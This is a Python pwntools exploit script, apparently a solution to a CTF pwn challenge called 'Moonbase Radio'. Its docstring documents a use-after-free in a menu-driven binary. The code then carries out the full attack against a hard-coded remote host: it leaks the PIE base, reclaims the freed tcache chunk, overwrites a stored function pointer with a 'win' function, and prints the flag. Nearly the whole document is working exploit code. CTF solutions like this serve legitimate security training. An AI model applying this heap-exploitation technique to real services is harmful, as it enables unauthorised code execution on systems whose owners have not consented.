#!/usr/bin/env python3
"""Moonbase Radio (Safaricom CTF, pwn).

Remote: 54.72.82.22:8750   Binary: http://54.72.82.22:8620/downloads/receipt
sha256 2c45100895988a3b4aede7c6e2723970ff46d53351ad62104ef528b32b8ed606

Vulnerability (use-after-free):
  menu 1 -> malloc(0x40) chunk A, memset, A[0x38] = fn(0x124e), printf("channel=%p", fn)  [PIE leak]
  menu 2 -> free(A) but the pointer is NOT nulled              <-- UAF
  menu 3 -> malloc(0x40) into pointer2 then fread(ptr2, 1, 0x40, stdin)
            (tcache LIFO returns chunk A, so fread overwrites A incl. A[0x38])
  menu 4 -> if A: rdx = A[0x38]; call rdx     <-- arbitrary call of a controlled pointer

Exploit: leak PIE base from menu 1, free via menu 2, re-alloc via menu 3 and write
  0x38 filler + p64(win) with win = base + 0x1264  (dead function that opens
  "/run/receipt" and puts its contents), then trigger it with menu 4.
"""
import re
import sys
from pwn import context, remote, p64

context.log_level = "info"

HOST = "54.72.82.22"
PORT = 8750

LEAK_FN = 0x124E   # address printed by menu option 1
WIN     = 0x1264   # function() { char b[0xa0]; fopen("/run/receipt","r"); fgets; puts; }


def main():
    r = remote(HOST, PORT)

    # Banner is a bare "Moonbase Radio\n"; the menu reads scanf("%u") with no prompt.
    r.recvline(timeout=3)

    # Menu 1: allocate + leak PIE code pointer
    r.sendline(b"1")
    data = r.recvuntil(b"\n", timeout=3)
    print("[*] leak line:", data)
    m = re.search(rb"channel=(0x[0-9a-fA-F]+)", data)
    if not m:
        print("[!] no leak, got:", data)
        sys.exit(1)
    leak = int(m.group(1), 16)
    base = leak - LEAK_FN
    win = base + WIN
    print(f"[*] leak={leak:#x}  pie_base={base:#x}  win={win:#x}")

    # Menu 2: free chunk A (dangling pointer kept)
    r.sendline(b"2")

    # Menu 3: malloc returns A from tcache; fread 0x40 bytes we control
    r.sendline(b"3")
    payload = b"A" * 0x38 + p64(win)
    assert len(payload) == 0x40
    r.send(payload)

    # Menu 4: call *(A + 0x38) == win  -> prints /run/receipt
    r.sendline(b"4")

    out = r.recvrepeat(3)
    print(out.decode("latin-1", "replace"))

    mm = re.search(rb"safctf\{[0-9a-fA-F]+\}", out)
    if mm:
        print("FLAG:", mm.group(0).decode())
    r.close()


if __name__ == "__main__":
    main()
